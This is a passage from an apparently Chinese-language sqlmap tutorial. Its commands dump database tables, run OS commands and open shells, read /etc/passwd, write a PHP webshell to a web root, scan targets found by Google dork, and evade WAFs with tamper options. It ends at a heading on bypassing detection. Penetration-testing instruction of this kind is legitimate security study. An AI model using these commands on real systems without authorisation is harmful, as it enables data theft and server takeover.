<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --where=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;id>100&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 7. 限制导出数量</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> testdb</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> users</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dump</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --start=1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --stop=100</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span></code></pre></figure>
<h4 id="系统命令执行">系统命令执行<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#系统命令执行" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 执行单条命令</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --os-cmd=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;whoami&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 获取交互式Shell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --os-shell</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 读取敏感文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --file-read=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/etc/passwd&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --file-read=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;C:/windows/system32/drivers/etc/hosts&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 写入WebShell</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --file-write=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;shell.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --file-dest=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/var/www/html/shell.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span></code></pre></figure>
<h4 id="post注入">POST注入<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#post注入" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 简单POST注入</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/login.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;username=admin&amp;password=123&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># JSON格式POST注入</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/api/login&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;}'</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># XML格式POST注入</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/api&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'&lt;?xml version=&quot;1.0&quot;?>&lt;user>&lt;id>1&lt;/id>&lt;/user>'</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 标记具体注入点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/login.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --data=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;username=admin*&amp;password=123&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span></code></pre></figure>
<h4 id="cookie注入">Cookie注入<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#cookie注入" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Cookie参数注入</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --cookie=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;id=1; security=low&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --level=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 标记Cookie注入点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --cookie=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;id=1*; security=low&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 从文件加载Cookie</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --load-cookies=cookies.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --level=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span></code></pre></figure>
<h4 id="批量检测">批量检测<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#批量检测" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 从文件读取多个URL</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> targets.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># targets.txt 内容示例:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># http://example.com/page.php?id=1</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># http://test.com/product.php?pid=2</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># http://demo.com/user.php?uid=3</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Google Dork批量检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -g</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;inurl:product.php?id=&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 从Burp日志批量检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> burp.log</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span></span></code></pre></figure>
<h4 id="二阶注入">二阶注入<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#二阶注入" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 二阶注入检测</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> first.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --second-req=second.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 或指定二阶URL</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> first.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --second-url=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/result.php&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  --batch</span></span></code></pre></figure>
<h3 id="102-故障排查">10.2 故障排查<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#102-故障排查" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="常见错误与解决方案">常见错误与解决方案<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#常见错误与解决方案" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误1: 连接超时</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 增加超时时间和重试次数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--timeout</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">60</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --retries</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误2: WAF拦截</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 使用tamper和延时</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">space2comment</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --delay</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">3</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> --random-agent</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误3: 无法识别注入点</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 提高检测级别，手动标记注入点</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--level</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --risk</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">3</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 或使用 * 标记: -u &quot;url?id=1*&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误4: 会话数据损坏</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 清除会话重新测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--flush-session</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误5: 编码问题导致乱码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 指定正确的字符编码</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--charset</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">GBK</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">UTF-8</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误6: 目标不稳定</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 使用不稳定连接选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--unstable</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误7: SSL证书错误</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 强制SSL但忽略证书验证</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--force-ssl</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 错误8: 代理连接失败</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决: 检查代理设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--check-proxy</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://127.0.0.1:8080&quot;</span></span></code></pre></figure>
<h4 id="性能问题优化">性能问题优化<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#性能问题优化" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 问题1: 检测速度太慢</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决方案:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1) 指定数据库类型</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dbms</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">MySQL</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2) 减少测试技术</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EU</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3) 增加线程数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--threads</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4) 使用优化选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-o</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 5) 跳过静态参数</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--skip-static</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 综合优化:</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbms=MySQL</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --technique=EU</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --threads=5</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --batch</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 问题2: 时间盲注太慢</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 解决方案:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1) 减少延时秒数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--time-sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2) 使用二分法</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--code</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">200</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --string</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;success&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3) 避免使用时间盲注</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">BEU</span></span></code></pre></figure>
<h4 id="绕过检测技巧">绕过检测技巧<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#绕过检测技巧" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
